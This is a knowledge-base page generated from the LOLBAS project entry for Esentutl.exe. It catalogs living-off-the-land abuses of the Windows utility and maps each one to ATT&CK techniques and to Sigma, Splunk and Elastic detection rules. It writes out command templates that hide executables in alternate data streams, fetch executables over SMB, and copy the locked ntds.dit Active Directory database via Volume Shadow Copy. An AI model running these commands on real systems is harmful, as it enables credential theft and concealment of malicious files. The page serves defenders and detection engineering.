---
title: "Esentutl.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Esentutl.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Esentutl.exe"
functions:
  - "Copy"
  - "ADS"
  - "Download"
attack_technique_ids:
  - "T1105"
  - "T1564.004"
  - "T1003.003"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Esentutl.exe

Binary for working with Microsoft Joint Engine Technology (JET) database

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Esentutl.yml

## Paths

- `C:\Windows\System32\esentutl.exe`
- `C:\Windows\SysWOW64\esentutl.exe`

## Commands

### 1. Copy

Copies the source VBS file to the destination VBS file.

```cmd
esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o
```

- Use Case: Copies files from A to B
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

### 2. ADS

Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.

```cmd
esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o
```

- Use Case: Copy file and hide it in an alternate data stream as a defensive counter measure
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564.004]]

### 3. ADS

Copies the source Alternate Data Stream (ADS) to the destination EXE.

```cmd
esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o
```

- Use Case: Extract hidden file within alternate data streams
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564.004]]

### 4. ADS

Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.

```cmd
esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o
```

- Use Case: Copy file and hide it in an alternate data stream as a defensive counter measure
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564.004]]

### 5. Download

Copies the source EXE to the destination EXE file

```cmd
esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o
```

- Use Case: Use to copy files from one unc path to another
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564.004]]

### 6. Copy

Copies a (locked) file using Volume Shadow Copy

```cmd
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit}
```

- Use Case: Copy/extract a locked file such as the AD Database
- Privileges: Admin
- Operating System: Windows 10, Windows 11, Windows 2016 Server, Windows 2019 Server
- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping|T1003.003]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_esentutl_params.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_esentutl_webcache.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/registry/registry_event/registry_event_esentutl_volume_shadow_copy_service_keys.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_esentutl_sensitive_file_copy.yml
- Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/esentutl_sam_copy.yml
- Elastic: https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_copy_ntds_sam_volshadowcp_cmdline.toml

## Resources

- {'Link': 'https://twitter.com/egre55/status/985994639202283520'}
- {'Link': 'https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/'}
- {'Link': 'https://twitter.com/bohops/status/1094810861095534592'}

## Acknowledgements

- {'Person': 'egre55', 'Handle': '@egre55'}
- {'Person': 'Mike Cary', 'Handle': '@grayfold3d'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml)
